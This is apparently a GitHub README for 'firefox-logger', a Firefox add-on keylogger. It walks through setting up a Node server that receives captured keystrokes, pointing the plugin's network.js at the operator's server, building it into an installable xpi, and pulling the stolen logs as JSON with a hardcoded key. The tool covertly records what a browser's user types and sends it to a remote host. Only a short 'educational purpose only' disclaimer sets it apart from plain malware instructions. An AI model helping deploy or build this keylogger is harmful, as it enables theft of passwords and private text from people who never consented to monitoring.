# firefox-logger
A plugin based mozilla firefox keylogger. It can record keystrokes and send it over the network for server to log.

## How to use it?

### Setup server

* Clone the this repository using
```
$ git clone https://github.com/spl0i7/firefox-logger.git
```
* Make sure to install [nodejs](https://nodejs.org/en/download/package-manager) (4.x) prefered.
* Change directory to *server* folder and install dependencies
```
$ npm install
```
* Configure password to view logs by editing **app.js**
```javascript
var key = '7thi5i5s0mek3y!!';
```
* Configure port to listen by editing
```javascript
var port = 8080;
```
* Start server 
```
npm start
```
### Setup plugin

* Change directory to *plugin*
* Install jpm tool using npm package manager
```
# npm install jpm --global
```
* Change logging server to your own server by editing **network.js**
```javascript
var server = "http://127.0.0.1:8080/submit";
```
* Test the plugin using jpm
```bash
$ jpm run -b $(which firefox)
```
* If no errors were thrown untill now, it should work as desired.
* Plugin can be built into xpi by
```
$ jpm xpi
```

### Gathering logs

* Change directory to *client*.
* Edit **client.js** to set appropriate password and server address.

```javascript
[...]

uri:'http://127.0.0.1:8080/fetch/all';

[...]

key:'7thi5i5s0mek3y!!';
```

* This should now throw out logs in json format from the server.

---

### Warning
This package has absolutely no warranty. Use at your own risk. The author will accept no responsibility for any damage, whatsoever, caused by this program, this is meant for educational purpose only.

